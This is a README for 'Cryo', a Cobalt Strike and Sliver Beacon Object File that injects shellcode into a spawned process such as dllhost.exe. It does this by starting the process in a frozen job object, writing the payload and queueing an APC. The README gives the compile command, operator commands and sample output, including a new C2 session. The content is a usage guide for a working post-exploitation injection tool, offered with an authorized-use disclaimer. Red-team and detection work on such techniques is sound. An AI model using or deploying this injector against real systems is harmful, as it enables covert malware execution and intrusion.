# Cryo - Cobalt Strike & Sliver BOF
---
This is a Beacon Object File (BOF) that utilizes the Early Bird Cryo Injection technique in order to perform shellcode injection through frozen job objects.

The BOF allows for you to choose the EXE to spawn and the raw shellcode (payload.bin) you want executed.

---
# Intended use

Intended solely for authorized red-team engagements, penetration tests, and learning in isolated lab environments; unauthorized use is illegal and strictly prohibited.

--- 
# Compilation

The object file can be compiled using MinGW with the following command:

```bash
x86_64-w64-mingw32-gcc -c cryo.x64.c -o cryo.x64.o
```

---
# Cobalt Strike Usage

The cryo.cna file can be loaded into Cobalt Strike via the Script Manager. After import then the BOF can be run via the `cryo` command.

```
cryo C:\Windows\system32\dllhost.exe /home/kali/payload_x64.bin
```

## Example

```
beacon> help cryo
Usage: cryo C:\path\to\exe\to\hollow.exe /local/path/to/shellcode.bin
beacon> cryo C:\Windows\system32\dllhost.exe /home/kali/payload_x64.bin
[*] CRYO - Early Cryo Bird Injection Shellcode Injector
[*] Reading shellcode from: /home/kali/payload_x64.bin
[+] host called home, sent: 5842 bytes
[+] Process start in Job! PID: 8592
[+] NtAllocateVirtualMemoryEx allocated memory at 0x0000028398F50000
[+] Shellcode was written to 0x0000028398F50000
[+] NtQueueApcThread successfully queued APC
[+] Process thawed successfully!
```

---
# Sliver Usage

The BOF can be imported into Sliver using the `extensions` command.

```
extensions install /path/to/extension/json/file/dir/
extensions load /path/to/extension/json/file/dir/
```

After importing the BOF, the extension can be run via the `cryo` command.

## Example

```
[server] sliver (SOFT_INVESTMENT) > extensions install /home/sliver/

[*] Installing extension 'cryo' (v1.0.0) ...
[server] sliver (SOFT_INVESTMENT) > extensions load /home/sliver/

[*] Added cryo command: Early Cryo Bird Injection Technique

...

[server] sliver (SOFT_INVESTMENT) > help cryo

Early Cryo Bird Injection Technique

Usage:
======
  cryo [flags] pe bin

Args:
=====
  pe   string    C:\\full\\path\\to\\exe
  bin  string    /local/path/to/shellcode.bin

Flags:
======
  -h, --help           display help
  -t, --timeout int    command timeout in seconds (default: 60)

[server] sliver (SOFT_INVESTMENT) > cryo c:\\windows\\system32\\dllhost.exe /home/sliver/payload.bin

[*] Successfully executed cryo (coff-loader)
[*] Got output:
[+] Process start in Job! PID: 7800[+] NtAllocateVirtualMemoryEx allocated memory at 0x000001d28be10000[+] Shellcode was written to 0x000001d28be10000[+] NtQueueApcThread successfully queued APC[+] Process thawed successfully!

[*] Session 4d3e8310 SOFT_INVESTMENT - redacted:51924 (redacted) - windows/amd64
```

---
# References / Credit

This technique was ported to the BOF format using the code from @zero2504: https://github.com/zero2504/Early-Cryo-Bird-Injections/tree/main
